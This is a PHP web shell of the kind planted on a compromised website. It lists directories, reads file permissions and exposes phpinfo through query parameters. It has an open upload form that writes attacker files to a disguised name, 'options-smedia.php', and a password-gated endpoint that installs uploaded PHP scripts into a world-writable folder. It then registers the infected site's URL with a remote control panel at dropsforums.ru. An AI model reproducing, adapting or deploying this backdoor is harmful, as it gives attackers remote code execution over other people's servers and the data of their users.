<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/html; charset=utf-8');

if(isset($_GET['info1']))
{
echo phpinfo();
exit();
}
if(isset($_GET['info2']))
{
echo $_GET['vdir'];
$sdir = scandir($_GET['vdir']);
print_r($sdir);
exit();
}
if(isset($_GET['info3']))
{
echo substr(sprintf('%o', fileperms($_GET['vfile'])), -4);
exit();
}
if(isset($_GET['info4']))
{
echo '<html><head><title>Info4</title></head><body><form action="" method="post" enctype="multipart/form-data"><input type="file" name="ufile"><input type="submit" name="go" value="s"></form></body></html>';
	if(isset($_FILES['ufile'])) if(move_uploaded_file($_FILES['ufile']['tmp_name'],'./options-smedia.php')) echo 'ok';
exit();
}

$hashcode = '7a3cb9bdfa';
$scripts_dir_r = 0;
$scripts_dir = 'scripts';

	if(!is_dir($scripts_dir)) mkdir('scripts',0777);
	if(is_dir($scripts_dir))
	{
		if(chmod($scripts_dir,0777) === true) $scripts_dir_r = 1;	
	}

if(isset($_POST['hc']) && $_POST['hc'] == $hashcode && $scripts_dir_r == 1) 
{
	function get_scripts($scripts_dir)
	{
	$scripts_files = array();
		if(is_dir($scripts_dir))
		{
		$t_scripts_files = scandir($scripts_dir);
		sort($t_scripts_files);
		}
		if(count($t_scripts_files) > 0)
		{
			foreach($t_scripts_files as $k=>$scripts_file)
			{
			$file_format = substr($scripts_file,-4);
				if($file_format == '.php')
				{
				$scripts_files[] = $scripts_file;
				}
			}
		}	
	return $scripts_files;
	}
	if(count($_FILES) > 0)
	{
	$pr_scripts = get_scripts($scripts_dir);
		if(is_array($pr_scripts) && count($pr_scripts) > 0)
		{
			foreach($pr_scripts as $programm_script)
			{
			unlink($scripts_dir.'/'.$programm_script);
			}
		}
		foreach($_FILES as $t_filekey => $t_file)
		{
			if(substr($t_file['name'],0,6) == 'script') move_uploaded_file($t_file['tmp_name'],$scripts_dir.'/'.$t_file['name']);
		}
	$pr_scripts = get_scripts($scripts_dir);
		if(is_array($pr_scripts) && count($pr_scripts) > 0)
		{
		$t_pr_scripts = '';
			foreach($pr_scripts as $programm_script) $t_pr_scripts .= $programm_script;
			if($t_pr_scripts != $_POST['programm_scripts']) $scripts_dir_r = 0;
		}
	}
	if($scripts_dir_r == 1)
	{
	echo '1';
	chmod($scripts_dir,0755);
	}
exit();
}
	if($scripts_dir_r == 1)
	{
	chmod($scripts_dir,0755);
	$path = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$server_url = 'http://dropsforums.ru/panel/ping.php';
	$ping_init = curl_init($server_url);
	curl_setopt($ping_init, CURLOPT_POST, true);
	curl_setopt($ping_init, CURLOPT_TIMEOUT, 5);
	curl_setopt($ping_init, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ping_init, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ping_init, CURLOPT_POSTFIELDS, array('path' => $path, 'hashcode' => $hashcode));
	$ping = curl_exec($ping_init);
	if($ping === false) { $message =  '<span class="red">Ошибка curl: ' . curl_error($ping_init).'.</span>'; }
	elseif($ping == '1') $message = '<span class="green b">Скрипт добавлен в список клиентов.</span>';
	elseif($ping == '2') $message = '<span class="red b">Ошибка: скрипт уже существует в списке клиентов.</span>';
	else $message = '<div class="b red">Ошибка:</div><pre class="blue">'.$ping.'</pte>';
	curl_close($ping_init);
	}
	else $message = '<span class="red b">Ошибка: не удается создать директорию «scripts» с правами 777.</span>';
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="ru">
<head>
<title>Добавление скрипта в список клиентов</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="Content-Script-Type" content="text/javascript" />
<meta http-equiv="content-style-type" content="text/css" />
<style type="text/css">
p {margin:5px 0;}
.b{font-weight:bold;}
.red{color:#d00;}
.green{color:#378502;}
.blue {color:#0160be;}
</style>
</head>
<body>
'.$message.'
</body>
</html>';
?>